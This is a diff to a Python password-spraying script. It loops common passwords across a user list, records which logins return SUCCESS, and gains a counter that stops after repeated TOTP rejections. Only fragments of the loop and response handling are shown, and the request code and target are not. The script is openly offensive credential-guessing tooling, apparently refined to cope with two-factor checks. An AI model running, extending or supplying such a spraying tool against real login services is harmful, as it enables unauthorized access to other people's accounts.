@@ -1,4 +1,6 @@
-# password spraying attack
+"""
+Script for password spraying attack
+"""
 import requests
 import time
 import json
@@ -25,7 +27,8 @@ def load_users():
 def password_spray():
     users = load_users()
     common_passwords = load_wordlist()
-
+    totp_failures = 0
+    
     for pwd in common_passwords:
         print(f"\n[INFO] Trying common password: {pwd}")
         for user in users:
@@ -63,6 +66,13 @@ def password_spray():
             if resp.status_code == 401 and "Invalid TOTP" in resp.text:
                 print(f"[TOTP] {username} rejected due to invalid TOTP, stopping attempts.")
                 break
+            
+            if user.get("totp_secret") and resp.status_code == 401:
+                totp_failures += 1 
+                if totp_failures >= 10: 
+                    print(f"[TOTP] {username} requires valid token, stopping attempts.")
+                    break
+
             
             if resp.status_code == 200:
                 result = "SUCCESS"
